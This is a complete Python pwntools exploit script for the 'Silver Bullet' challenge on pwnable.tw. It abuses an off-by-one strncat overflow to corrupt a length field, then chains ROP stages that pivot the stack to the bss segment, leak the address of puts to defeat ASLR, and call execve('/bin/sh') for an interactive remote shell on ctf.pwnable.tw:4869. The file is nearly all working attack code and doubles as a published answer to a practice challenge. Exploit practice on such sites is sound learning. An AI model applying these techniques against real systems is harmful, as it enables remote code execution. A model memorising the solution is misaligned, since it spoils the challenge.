from pwn import *

class SilverBulletSolver(object):
    bufmax        = 48
    bufsize       = 0x34
    puts_plt      = 0x80484a8
    puts_got      = 0x804afdc
    puts_libc     = 0x0005f140
    bss_buf       = 0x0804b120
    power_overlap = 0x800101

    def __init__(self, prog, libc, ps):
        self.prog = ELF(prog)
        self.libc = ELF(libc)
        self.ps   = ps

    def create_bullet(self, desc):
        # Choose create bullet on the menu
        self.ps.sendafter('choice :', '1')
        # Send desc
        self.ps.sendlineafter('bullet :', desc)
        print self.ps.recvline(keepends=False)

    def power_up(self, desc):
        # Choose power up on the menu
        self.ps.sendafter('choice :', '2')
        # Send appending desc
        self.ps.sendafter('bullet :', desc)
        print self.ps.recvline(keepends=False)

    def beat(self):
        # Choose power up on the menu
        self.ps.sendlineafter('choice :', '3')
        print self.ps.recvuntil('!!')

    def construct_rop1(self):
        migrate_to = self.bss_buf
        rop        = ROP([self.prog])

        rop.call('read_input', (migrate_to, 0x01010101))
        rop.migrate(migrate_to)

        return str(rop)

    def construct_rop2(self):
        migrate_to = self.bss_buf + 0x100
        rop        = ROP([self.prog])

        rop.call(self.puts_plt, (self.puts_got, ))
        rop.call('read_input', (migrate_to, 0x100))
        rop.migrate(migrate_to)
        return str(rop)

    def construct_rop3(self):
        rop   = ROP([self.prog, self.libc])
        binsh = next(self.libc.search('/bin/sh'))

        rop.execve(binsh, 0, 0)
        return str(rop)

    def spawn_shell(self):
        self.create_bullet('A' * (self.bufmax - 1)) # Power = bufmax - 1
        self.power_up('A')                          # Power = 1 because strncat add \0 that overlap power

        # Send rop1, migrate to rop2
        self.power_up(
            pack(self.power_overlap, 24, 'little', False) +
            'A' * (self.bufsize - self.bufmax - 4 + 4) + 
            self.construct_rop1()
        )
        #gdb.attach(self.ps)
        self.beat()
        self.ps.recvline()

        # Send rop2, leak addr of libc and migrate to rop3
        self.ps.send(self.construct_rop2())
        puts_addr         = u32(self.ps.recvline(keepends=False)[:4])
        self.libc.address = puts_addr - self.puts_libc
        
        self.ps.send(self.construct_rop3())
        self.ps.interactive()


if __name__ == '__main__':
    solver = SilverBulletSolver(
        './Silver_Bullet/Silver_Bullet',
        './Silver_Bullet/libc-5221435a058b204c3616b10dc7d7e6d0.so',
        remote('ctf.pwnable.tw', 4869)
    )
    solver.spawn_shell()

